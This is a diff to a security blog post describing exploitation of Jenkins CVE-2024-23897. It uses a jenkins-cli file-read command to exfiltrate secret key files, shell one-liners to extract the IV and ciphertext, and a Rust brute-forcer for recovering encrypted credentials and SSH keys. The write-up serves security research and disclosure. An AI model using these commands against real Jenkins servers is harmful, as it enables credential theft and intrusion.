@@ -121,10 +121,10 @@ A Wireshark analysis was conducted to examine the retrieval of binary files. Not
 
 EF BF BD (in hex), which is the utf-8 encoding of the Unicode character U+FFFD [Replacement characters](https://www.fileformat.info/info/unicode/char/0fffd/index.htm).When decoding sequences of bytes into Unicode characters, a program may encounter a group bytes that is invalid (i.e. it does not correspond to a Unicode character). In such cases, the program has three choices: it can stop decoding and raise an error, silently skip over the invalid group of bytes, or translate the group of bytes into a special marker. This latter scheme allows most of the text to be read, but still leaves an indication that something went wrong.
 
-coming across the blog of [errno](https://www.errno.fr/bruteforcing_CVE-2024-23897.html), it was an amazing inspiration for me. Errno explained the UTF-8 and `EFBFBD` replacement character to brute force and wrote a nice code in rust to crack it. 
+coming across the blog of [Guillaume](https://www.errno.fr/bruteforcing_CVE-2024-23897.html), it was an amazing inspiration for me. Guillaume explained the UTF-8 and `EFBFBD` replacement character to brute force and wrote a nice code in rust to crack it. 
 
 ## Crack Me If You Can: Thanks to Uncle Sam's Export Rules!
-As previously mentioned, the vulnerability is limited by the ability to read only a few lines of the key, making it challenging to crack. However, Errno made a new discovery: due to US export restrictions, the keys are limited to just `128 bits`, or `16 bytes`. 
+As previously mentioned, the vulnerability is limited by the ability to read only a few lines of the key, making it challenging to crack. However, Guillaume made a new discovery: due to US export restrictions, the keys are limited to just `128 bits`, or `16 bytes`. 
 
 ![US export keys](https://ahmedsherif.github.io/assets/img/posts/2/export-keys-jenkins.png)
 
@@ -137,9 +137,9 @@ Now with given the encrypted credentials that are in credentials.xml file, or yo
 ![CBC attack](https://ahmedsherif.github.io/assets/img/posts/2/cbc-attack.png)
 
 
-## Events often unfold contrary to our desires
+## The wind does not blow as the ships desire
 
-Having thoroughly reviewed the Errno code and blog post, and comprehending the concept of replacement characters, I was eager to begin deciphering the Hudson and confidentiality keys. Unfortunately, this anticipation was met with disappointment.
+Having thoroughly reviewed the Guillaume code and blog post, and comprehending the concept of replacement characters, I was eager to begin deciphering the Hudson and confidentiality keys. Unfortunately, this anticipation was met with disappointment.
 
 Upon examining the initial 16 bytes in my case, it was evident that the `EFBFBD` replacement character was absent.
 
@@ -158,9 +158,13 @@ cat hudson.bin | tail -c +33 | head -c +16 | xxd
 
 ### Byte patterns
 
-Well, since we lost hope in our case for finding the replacement characters `EFBFBD`, we could actually assume that the hudson file did not have non-printable characters and is correct, but that was not the case since we could not decrypt our credentials with it. 
+I couldn't find the replacement bytes `EFBFBD`, which might mean the Hudson binary file was correctly retrieved, or something else is at play. Cracking the confidentiality key didn't work.
 
-The other assumption is that we have a different encoding and replacement character could be anything else, so maybe we can try with repeated bytes?! 
+Considering a different encoding might change the replacement bytes, I wondered if it was a sequence or just one byte.
+
+I set up several Jenkins instances with different environments, reading the binary files to spot patterns. I suspected the replacement byte could be a single byte.
+
+Using this one-liner, I checked for the most repeated byte, identifying `0x3f` as a potential replacement byte
 
 ```bash
 dd if=hudson.bin bs=1 skip=32 count=16 2>/dev/null | xxd -p | fold -w2 | sort | uniq -c | sort -nr | head -n 1
@@ -170,11 +174,102 @@ dd if=hudson.bin bs=1 skip=32 count=16 2>/dev/null | xxd -p | fold -w2 | sort | 
 
 Of course, I was not sure if this approach will work or not but that was the next logical step for me. 
 
+## Analyzing encrypted file, get IV and Ciphertext
+
+Additionally based on the above testing, we need to analyze the cipher text and extract the IV and 16 bytes of the cipher. It was noticed that the file has a header, then IV, and then the ciphertext. 
+
+![Ciphertext-analysis](https://ahmedsherif.github.io/assets/img/posts/2/ciphertext.png)
+
+The IV starts usually after the header from the `10th` byte. 
+
+### Placing all together 
+
+Now it is time to place all together and automate the steps to crack the encrypted credentials: 
+
+#### Getting the hudson file
+*Getting Hudson file* 
+```bash
+java -jar ~/Downloads/jenkins-cli.jar -s http://sherif.com:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
+```
+*sorting the master.key*
+
+The steps needed for master key is to hex it, and sha256 of first `16 bytes`
 ```bash
 cat masterkey.bin | xxd -p | tr -d '\n' | xxd -r -p | sha256sum | cut -c1-32 | sed 's/../0x&,/g'
 ```
+*Getting IV and cipher text* 
 
-
+You can apply these lines to the cipher text
 ```bash
-java -jar ~/Downloads/jenkins-cli.jar -s http://127.0.0.1:9091 who-am-i '@/var/jenkins_home/secrets/hudson.util.Secret' 2>&1  | tail -c +33 | head -c 192 | xxd | tee hudson.bin
+echo -n $1 | base64 -d | tail -c +10 | head -c +16 | xxd -p | sed 's/../0x&,/g'
+echo -n $1 | base64 -d | tail -c +26 | xxd -p | sed 's/../0x&,/g'
 ```
+The first output is for the IV, second for the ciphertext.
+*Start brute forcing* 
+
+I'll be using the same rust code that was developed by Guillaume with slight modification of checking only printable characters and also check if the first 5 bytes of decrypted text are `-----` which is the start of the private ssh key. 
+
+```rust
+extern crate aes;
+extern crate rayon;
+extern crate itertools;
+
+use std::str;
+use rayon::prelude::*;
+use aes::Aes128;
+use aes::cipher::typenum;
+use aes::cipher::{
+    BlockDecrypt, KeyInit,
+    generic_array::GenericArray,
+};
+
+fn do_decrypt(candidate: GenericArray<u8, typenum::U16>) {
+    let mut ct = GenericArray::from([]);
+    let iv = GenericArray::from([]);
+
+    let cipher2 = Aes128::new(&candidate);
+    cipher2.decrypt_block(&mut ct);
+
+    // AES-CBC, need to xor pt with iv
+    for n in 0..16 {
+        ct[n] ^= iv[n];
+    }
+    // checking if the first 5 bytes start with ----
+    for k in 0..5{
+     if ct[k] != 0x2d {
+        return
+     }
+    }
+    // ensure that all decrypted bytes are printable characters
+   for k in 0..16 {
+    if ct[k as usize] > 0x7F || ct[k as usize] < 0x20 {
+        return 
+    }
+   }
+
+    println!("{:?}: Candidate {:?}", str::from_utf8(&ct), &candidate);
+}
+
+fn main() {
+    let derived_master_key = GenericArray::from([]);
+    let cipher1 = Aes128::new(&derived_master_key);
+
+    let vec: Vec<u8> = (0x80..=0xFF).collect();
+
+    vec.par_iter().for_each(|a: &u8| {
+        for b in 0x80..=0xFF {
+            for c in 0x80..=0xFF {
+                for d in 0x80..=0xFF {
+                    for e in 0x80..=0xFF {
+                            let mut candidate = GenericArray::from([]);
+                            cipher1.decrypt_block(&mut candidate);
+                            do_decrypt(candidate)
+                    }
+                }
+            }
+        }
+    });
+}
+```
+
+### Final thoughts 
